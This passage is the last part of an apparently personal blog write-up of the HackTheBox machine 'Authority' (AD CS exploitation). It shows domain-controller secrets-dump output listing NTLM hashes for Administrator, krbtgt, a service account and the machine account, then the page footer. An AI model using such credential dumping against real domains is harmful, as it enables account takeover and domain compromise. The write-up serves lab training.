</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=nx>Using</span> <span class=nx>the</span> <span class=nx>DRSUAPI</span> <span class=nx>method</span> <span class=nx>to</span> <span class=nx>get</span> <span class=nx>NTDS</span><span class=p>.</span><span class=nx>DIT</span> <span class=nx>secrets</span>
</span></span><span class=line><span class=cl><span class=nx>Administrator</span><span class=o>:</span><span class=mi>500</span><span class=o>:</span><span class=nx>aad3b435b51404eeaad3b435b51404ee</span><span class=o>:</span><span class=mi>6961</span><span class=nx>f422924da90a6928197429eea4ed</span><span class=o>:::</span>
</span></span><span class=line><span class=cl><span class=nx>Guest</span><span class=o>:</span><span class=mi>501</span><span class=o>:</span><span class=nx>aad3b435b51404eeaad3b435b51404ee</span><span class=o>:</span><span class=mi>31</span><span class=nx>d6cfe0d16ae931b73c59d7e0c089c0</span><span class=o>:::</span>
</span></span><span class=line><span class=cl><span class=nx>krbtgt</span><span class=o>:</span><span class=mi>502</span><span class=o>:</span><span class=nx>aad3b435b51404eeaad3b435b51404ee</span><span class=o>:</span><span class=nx>bd6bd7fcab60ba569e3ed57c7c322908</span><span class=o>:::</span>
</span></span><span class=line><span class=cl><span class=nx>svc_ldap</span><span class=o>:</span><span class=mi>1601</span><span class=o>:</span><span class=nx>aad3b435b51404eeaad3b435b51404ee</span><span class=o>:</span><span class=mi>6839</span><span class=nx>f4ed6c7e142fed7988a6c5d0c5f1</span><span class=o>:::</span>
</span></span><span class=line><span class=cl><span class=nx>AUTHORITY$</span><span class=o>:</span><span class=mi>1000</span><span class=o>:</span><span class=nx>aad3b435b51404eeaad3b435b51404ee</span><span class=o>:</span><span class=nx>fd46a391cd96241d31c6cf3402c4c365</span><span class=o>:::</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>--</span><span class=nx>SNIP</span><span class=o>--</span><span class=p>]</span>
</span></span></code></pre></div></div><footer class=post-footer><ul class=post-tags><li><a href=//localhost:1313/tags/windows/>Windows</a></li><li><a href=//localhost:1313/tags/ad/>AD</a></li><li><a href=//localhost:1313/tags/adcs/>Adcs</a></li><li><a href=//localhost:1313/tags/medium/>Medium</a></li><li><a href=//localhost:1313/tags/hackthebox/>Hackthebox</a></li><li><a href=//localhost:1313/tags/ldap/>Ldap</a></li><li><a href=//localhost:1313/tags/ansible/>Ansible</a></li><li><a href=//localhost:1313/tags/esc1/>Esc1</a></li></ul><nav class=paginav><a class=prev href=//localhost:1313/posts/busqueda/><span class=title>« Prev</span><br><span>The Path to Root: Hijacking the Search on HTB 'Busqueda'</span>
</a><a class=next href=//localhost:1313/posts/interface/><span class=title>Next »</span><br><span>Beyond the Interface: Escalating with a Bash Operator Flaw</span></a></nav><ul class=share-buttons><li><a target=_blank rel="noopener noreferrer" aria-label="share Becoming the Authority: An AD CS Exploit on HTB 'Authority' on x" href="https://x.com/intent/tweet/?text=Becoming%20the%20Authority%3a%20An%20AD%20CS%20Exploit%20on%20HTB%20%27Authority%27&amp;url=%2f%2flocalhost%3a1313%2fposts%2fauthority%2f&amp;hashtags=windows%2cAD%2cadcs%2cmedium%2chackthebox%2cldap%2cansible%2cesc1"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentColor"><path d="M512 62.554V449.446C512 483.97 483.97 512 449.446 512H62.554C28.03 512 0 483.97.0 449.446V62.554C0 28.03 28.029.0 62.554.0H449.446C483.971.0 512 28.03 512 62.554zM269.951 190.75 182.567 75.216H56L207.216 272.95 63.9 436.783h61.366L235.9 310.383l96.667 126.4H456L298.367 228.367l134-153.151H371.033zM127.633 110h36.468l219.38 290.065H349.5z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share Becoming the Authority: An AD CS Exploit on HTB 'Authority' on linkedin" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=%2f%2flocalhost%3a1313%2fposts%2fauthority%2f&amp;title=Becoming%20the%20Authority%3a%20An%20AD%20CS%20Exploit%20on%20HTB%20%27Authority%27&amp;summary=Becoming%20the%20Authority%3a%20An%20AD%20CS%20Exploit%20on%20HTB%20%27Authority%27&amp;source=%2f%2flocalhost%3a1313%2fposts%2fauthority%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentColor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM160.461 423.278V197.561h-75.04v225.717h75.04zm270.539.0V293.839c0-69.333-37.018-101.586-86.381-101.586-39.804.0-57.634 21.891-67.617 37.266v-31.958h-75.021c.995 21.181.0 225.717.0 225.717h75.02V297.222c0-6.748.486-13.492 2.474-18.315 5.414-13.475 17.767-27.434 38.494-27.434 27.135.0 38.007 20.707 38.007 51.037v120.768H431zM123.448 88.722C97.774 88.722 81 105.601 81 127.724c0 21.658 16.264 39.002 41.455 39.002h.484c26.165.0 42.452-17.344 42.452-39.002-.485-22.092-16.241-38.954-41.943-39.002z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share Becoming the Authority: An AD CS Exploit on HTB 'Authority' on reddit" href="https://reddit.com/submit?url=%2f%2flocalhost%3a1313%2fposts%2fauthority%2f&title=Becoming%20the%20Authority%3a%20An%20AD%20CS%20Exploit%20on%20HTB%20%27Authority%27"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentColor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM446 265.638c0-22.964-18.616-41.58-41.58-41.58-11.211.0-21.361 4.457-28.841 11.666-28.424-20.508-67.586-33.757-111.204-35.278l18.941-89.121 61.884 13.157c.756 15.734 13.642 28.29 29.56 28.29 16.407.0 29.706-13.299 29.706-29.701.0-16.403-13.299-29.702-29.706-29.702-11.666.0-21.657 6.792-26.515 16.578l-69.105-14.69c-1.922-.418-3.939-.042-5.585 1.036-1.658 1.073-2.811 2.761-3.224 4.686l-21.152 99.438c-44.258 1.228-84.046 14.494-112.837 35.232-7.468-7.164-17.589-11.591-28.757-11.591-22.965.0-41.585 18.616-41.585 41.58.0 16.896 10.095 31.41 24.568 37.918-.639 4.135-.99 8.328-.99 12.576.0 63.977 74.469 115.836 166.33 115.836s166.334-51.859 166.334-115.836c0-4.218-.347-8.387-.977-12.493 14.564-6.47 24.735-21.034 24.735-38.001zM326.526 373.831c-20.27 20.241-59.115 21.816-70.534 21.816-11.428.0-50.277-1.575-70.522-21.82-3.007-3.008-3.007-7.882.0-10.889 3.003-2.999 7.882-3.003 10.885.0 12.777 12.781 40.11 17.317 59.637 17.317 19.522.0 46.86-4.536 59.657-17.321 3.016-2.999 7.886-2.995 10.885.008 3.008 3.011 3.003 7.882-.008 10.889zm-5.23-48.781c-16.373.0-29.701-13.324-29.701-29.698.0-16.381 13.328-29.714 29.701-29.714 16.378.0 29.706 13.333 29.706 29.714.0 16.374-13.328 29.698-29.706 29.698zM160.91 295.348c0-16.381 13.328-29.71 29.714-29.71 16.369.0 29.689 13.329 29.689 29.71.0 16.373-13.32 29.693-29.689 29.693-16.386.0-29.714-13.32-29.714-29.693z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share Becoming the Authority: An AD CS Exploit on HTB 'Authority' on facebook" href="https://facebook.com/sharer/sharer.php?u=%2f%2flocalhost%3a1313%2fposts%2fauthority%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentColor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H342.978V319.085h66.6l12.672-82.621h-79.272v-53.617c0-22.603 11.073-44.636 46.58-44.636H425.6v-70.34s-32.71-5.582-63.982-5.582c-65.288.0-107.96 39.569-107.96 111.204v62.971h-72.573v82.621h72.573V512h-191.104c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share Becoming the Authority: An AD CS Exploit on HTB 'Authority' on whatsapp" href="https://api.whatsapp.com/send?text=Becoming%20the%20Authority%3a%20An%20AD%20CS%20Exploit%20on%20HTB%20%27Authority%27%20-%20%2f%2flocalhost%3a1313%2fposts%2fauthority%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentColor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zm-58.673 127.703c-33.842-33.881-78.847-52.548-126.798-52.568-98.799.0-179.21 80.405-179.249 179.234-.013 31.593 8.241 62.428 23.927 89.612l-25.429 92.884 95.021-24.925c26.181 14.28 55.659 21.807 85.658 21.816h.074c98.789.0 179.206-80.413 179.247-179.243.018-47.895-18.61-92.93-52.451-126.81zM263.976 403.485h-.06c-26.734-.01-52.954-7.193-75.828-20.767l-5.441-3.229-56.386 14.792 15.05-54.977-3.542-5.637c-14.913-23.72-22.791-51.136-22.779-79.287.033-82.142 66.867-148.971 149.046-148.971 39.793.014 77.199 15.531 105.329 43.692 28.128 28.16 43.609 65.592 43.594 105.4-.034 82.149-66.866 148.983-148.983 148.984zm81.721-111.581c-4.479-2.242-26.499-13.075-30.604-14.571-4.105-1.495-7.091-2.241-10.077 2.241-2.986 4.483-11.569 14.572-14.182 17.562-2.612 2.988-5.225 3.364-9.703 1.12-4.479-2.241-18.91-6.97-36.017-22.23C231.8 264.15 222.81 249.484 220.198 245s-.279-6.908 1.963-9.14c2.016-2.007 4.48-5.232 6.719-7.847 2.24-2.615 2.986-4.484 4.479-7.472 1.493-2.99.747-5.604-.374-7.846-1.119-2.241-10.077-24.288-13.809-33.256-3.635-8.733-7.327-7.55-10.077-7.688-2.609-.13-5.598-.158-8.583-.158-2.986.0-7.839 1.121-11.944 5.604-4.105 4.484-15.675 15.32-15.675 37.364.0 22.046 16.048 43.342 18.287 46.332 2.24 2.99 31.582 48.227 76.511 67.627 10.685 4.615 19.028 7.371 25.533 9.434 10.728 3.41 20.492 2.929 28.209 1.775 8.605-1.285 26.499-10.833 30.231-21.295 3.732-10.464 3.732-19.431 2.612-21.298-1.119-1.869-4.105-2.99-8.583-5.232z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share Becoming the Authority: An AD CS Exploit on HTB 'Authority' on telegram" href="https://telegram.me/share/url?text=Becoming%20the%20Authority%3a%20An%20AD%20CS%20Exploit%20on%20HTB%20%27Authority%27&amp;url=%2f%2flocalhost%3a1313%2fposts%2fauthority%2f"><svg viewBox="2 2 28 28" height="30" width="30" fill="currentColor"><path d="M26.49 29.86H5.5a3.37 3.37.0 01-2.47-1 3.35 3.35.0 01-1-2.47V5.48A3.36 3.36.0 013 3 3.37 3.37.0 015.5 2h21A3.38 3.38.0 0129 3a3.36 3.36.0 011 2.46V26.37a3.35 3.35.0 01-1 2.47 3.38 3.38.0 01-2.51 1.02zm-5.38-6.71a.79.79.0 00.85-.66L24.73 9.24a.55.55.0 00-.18-.46.62.62.0 00-.41-.17q-.08.0-16.53 6.11a.59.59.0 00-.41.59.57.57.0 00.43.52l4 1.24 1.61 4.83a.62.62.0 00.63.43.56.56.0 00.4-.17L16.54 20l4.09 3A.9.9.0 0021.11 23.15zM13.8 20.71l-1.21-4q8.72-5.55 8.78-5.55c.15.0.23.0.23.16a.18.18.0 010 .06s-2.51 2.3-7.52 6.8z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share Becoming the Authority: An AD CS Exploit on HTB 'Authority' on ycombinator" href="https://news.ycombinator.com/submitlink?t=Becoming%20the%20Authority%3a%20An%20AD%20CS%20Exploit%20on%20HTB%20%27Authority%27&u=%2f%2flocalhost%3a1313%2fposts%2fauthority%2f"><svg width="30" height="30" viewBox="0 0 512 512" fill="currentColor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554V449.446C512 483.97 483.97 512 449.446 512H62.554C28.03 512 0 483.97.0 449.446V62.554C0 28.03 28.029.0 62.554.0H449.446zM183.8767 87.9921h-62.034L230.6673 292.4508V424.0079h50.6655V292.4508L390.1575 87.9921H328.1233L256 238.2489z"/></svg></a></li></ul></footer></article></main><footer class=footer><span>&copy; 2025 <a href=//localhost:1313/>Fieryrival's Blog</a></span> ·
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
<a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentColor"><path d="M12 6H0l6-6z"/></svg>
</a><script>let menu=document.getElementById("menu");if(menu){const e=localStorage.getItem("menu-scroll-position");e&&(menu.scrollLeft=parseInt(e,10)),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}}document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{const e=document.querySelector("html");e.dataset.theme==="dark"?(e.dataset.theme="light",localStorage.setItem("pref-theme","light")):(e.dataset.theme="dark",localStorage.setItem("pref-theme","dark"))})</script></body></html>